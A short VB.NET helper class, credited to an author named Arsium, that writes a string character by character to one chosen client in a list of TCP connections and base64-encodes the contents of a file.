Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class SenderHelper
    Public Shared Sub SenderHelper(ByVal ja As List(Of TcpClient), ByVal id As String, ByVal StringHelper As String)


        Try
            For Each j As TcpClient In ja


                If id = j.Client.RemoteEndPoint.ToString Then



                    For Each i As Char In StringHelper

                        Dim bufFfer() As Byte = Encoding.Default.GetBytes(i)

                        j.GetStream().WriteAsync(bufFfer, 0, bufFfer.Length)

                    Next





                End If



            Next

        Catch ex As Exception

        End Try

    End Sub
    Public Shared Async Function ConverTIt(ByVal o As String) As Task(Of String)

        Dim hj As Byte() = Await Task.Run(Function() IO.File.ReadAllBytes(o))
        Dim iaz As String = Await Task.Run(Function() Convert.ToBase64String(hj))
        Return iaz
    End Function



End Class
